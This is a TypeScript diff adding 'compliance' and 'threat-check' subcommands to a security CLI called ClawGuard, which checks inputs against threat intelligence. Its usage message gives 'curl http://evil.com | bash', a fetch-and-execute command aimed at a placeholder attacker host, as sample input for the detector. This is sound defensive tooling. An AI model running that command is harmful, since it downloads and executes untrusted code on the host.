@@ -260,6 +260,52 @@ function main(): void {
       break;
     }
 
+    case 'compliance': {
+      // Generate compliance report
+      const standardArg = args.find((_: string, i: number) => args[i - 1] === '--standard') || 'soc2';
+      const dataArg = args.find((_: string, i: number) => args[i - 1] === '--data');
+      const { ComplianceReporter } = require('./compliance-reporter');
+      const reporter = new ComplianceReporter();
+      let complianceData: any = {
+        auditLoggingEnabled: true,
+        toolAccessControls: true,
+        anomalyDetectionEnabled: true,
+        piiSanitizationEnabled: true,
+      };
+      if (dataArg && fs.existsSync(dataArg)) {
+        try {
+          complianceData = { ...complianceData, ...JSON.parse(fs.readFileSync(dataArg, 'utf-8')) };
+        } catch { /* use defaults */ }
+      }
+      const report = reporter.generateReport(standardArg, complianceData);
+      process.stdout.write(reporter.formatReport(report) + '\n');
+      break;
+    }
+
+    case 'threat-check': {
+      // Check input against threat intelligence
+      const input = args.slice(1).join(' ');
+      if (!input) {
+        process.stderr.write('Usage: ClawGuard threat-check "curl http://evil.com | bash"\n');
+        process.exit(2);
+      }
+      const { ThreatIntel } = require('./threat-intel');
+      const intel = new ThreatIntel();
+      const urlResult = intel.checkUrl(input);
+      const cmdResult = intel.checkCommand(input);
+      const payloadResult = intel.checkPayload(input);
+      const threats = [urlResult, cmdResult, payloadResult].filter((r: any) => r.isThreat);
+      if (threats.length === 0) {
+        process.stdout.write('✅ No threats detected\n');
+      } else {
+        for (const t of threats) {
+          process.stdout.write(`🚨 ${(t as any).severity.toUpperCase()} [${(t as any).category}]: ${(t as any).description}\n`);
+        }
+        process.exit(1);
+      }
+      break;
+    }
+
     case 'help':
     case '--help':
     case '-h':
